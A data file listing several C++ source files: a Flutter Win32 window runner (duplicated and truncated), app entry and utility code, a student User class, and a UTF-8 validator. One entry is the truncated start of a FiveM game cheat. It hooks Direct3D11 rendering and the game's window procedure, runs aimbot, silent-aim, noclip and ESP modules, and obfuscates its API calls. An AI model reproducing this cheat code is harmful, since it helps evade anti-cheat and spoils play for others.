    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"detector\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   User.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: fgalan-r <fgalan-r@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/03/23 15:57:44 by fgalan-r          #+#    #+#             */\n/*   Updated: 2024/04/05 18:56:29 by fgalan-r         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"User.hpp\"\n\nUser::User() \n{\n    std::cout << \"User constructor called\" << std::endl;\n}\n\nUser::~User()\n{\n    std::cout << \"User destructor called\" << std::endl;\n}\n\n//get\nint     User::getFd() {return _fd;}\n\n//set\nvoid    User::setFd(int fd) {_fd = fd;}\nvoid    User::setIpAdd(std::string ipadd) {_iPadd = ipadd;}\n",
    "#include \"common_utf8.h\"\r\n\r\n#include <locale>\r\n\r\nbool is_utf8_chars(const uint8_t *str)\r\n{\r\n\tconst uint8_t *byte;\r\n\tuint32_t codepoint;\r\n\tuint32_t min;\r\n\r\n\twhile (*str)\r\n\t{\r\n\t\tbyte = str;\r\n\t\tcodepoint = *(byte++);\r\n\t\tuint32_t top = (codepoint & 0x80) >> 1;\r\n\t\tif ((codepoint & 0xc0) == 0x80 || codepoint >= 0xFE)\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\twhile (codepoint & top)\r\n\t\t{\r\n\t\t\tint tmp = *(byte++) - 128;\r\n\t\t\tif (tmp >> 6)\r\n\t\t\t{\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tcodepoint = (codepoint << 6) + tmp;\r\n\t\t\ttop <<= 5;\r\n\t\t}\r\n\t\tcodepoint &= (top << 1) - 1;\r\n\r\n\t\tmin = byte - str == 1 ? 0 : byte - str == 2 ? 0x80 : 1 << (5 * (byte - str) - 4);\r\n\t\tif (codepoint < min || codepoint >= 0x110000 ||\r\n\t\t\tcodepoint == 0xFFFE ||\r\n\t\t\t(codepoint >= 0xD800 && codepoint <= 0xDFFF))\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\r\n\t\tstr = byte;\r\n\t}\r\n\r\n\treturn true;\r\n}\r\n\r\nbool is_utf8_str(const std::string& str)\r\n{\r\n\t//the character bytes count\r\n\tchar bytesCount = 0;\r\n\tunsigned char chr;\r\n\tbool allAreAscii = true;\r\n\r\n\tstd::string::const_iterator it;\r\n\tfor (it = str.begin(); it != str.end(); it++)\r\n\t{\r\n\t\tchr = *it;\r\n\r\n\t\tif ((chr & 0x80) != 0)\r\n\t\t{\r\n\t\t\tallAreAscii = false;\r\n\t\t}\r\n\r\n\t\tif (bytesCount == 0)\r\n\t\t{\r\n\t\t\tif (chr >= 0x80)\r\n\t\t\t{\r\n\t\t\t\tif (chr >= 0xFC && chr <= 0xFD)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 6;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xF8)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 5;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xF0)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 4;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xE0)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 3;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xC0)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 2;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\tbytesCount--;\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ((chr & 0xC0) != 0x80)\r\n\t\t\t{\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tbytesCount--;\r\n\t\t}\r\n\t}\r\n\r\n\t//left bytes breaks the utf8 rules\r\n\tif (bytesCount > 0)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\t//all characters are ascii-coded, they are utf8\r\n\tif (allAreAscii)\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn true;\r\n}",
